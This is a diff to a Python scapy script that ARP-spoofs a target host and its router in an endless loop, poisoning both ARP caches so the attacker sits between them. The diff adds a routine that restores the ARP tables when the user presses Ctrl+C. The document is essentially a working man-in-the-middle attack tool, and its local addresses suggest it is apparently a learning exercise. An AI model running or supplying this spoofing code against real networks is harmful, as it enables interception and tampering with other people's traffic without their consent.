@@ -24,15 +24,30 @@ def get_mac(ip):
     return answered[0][1].hwsrc
     
 
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip)
+    scapy.send(packet, count=4, verbose=False)
+    pass
+
+
 
 #get_mac("172.17.0.3")
-sent_packets_count = 0
-while True:
-    spoof("172.17.0.3", "192.168.18.1")
-    sent_packets_count +=1
-    spoof("192.168.18.1", "172.17.0.3")
-    sent_packets_count +=1
-    print("\r[+] sent two packets: " + str(sent_packets_count), end="")
-    #sys.stdout.flush()
-    time.sleep(2)
-    pass
+target_ip = "172.17.0.3"
+router_ip = "172.17.0.1"
+try:
+    sent_packets_count = 0
+    while True:
+        spoof(target_ip, router_ip)
+        sent_packets_count +=1
+        spoof(router_ip, target_ip)
+        sent_packets_count +=1
+        print("\r[+] sent two packets: " + str(sent_packets_count), end="")
+        #sys.stdout.flush()
+        time.sleep(2)
+        pass
+except KeyboardInterrupt:
+    restore(target_ip, router_ip)
+    restore(router_ip, target_ip)
+    print("\n[+] Detected Ctrl + C Resetting ARP tables... Please wait.\n")
+
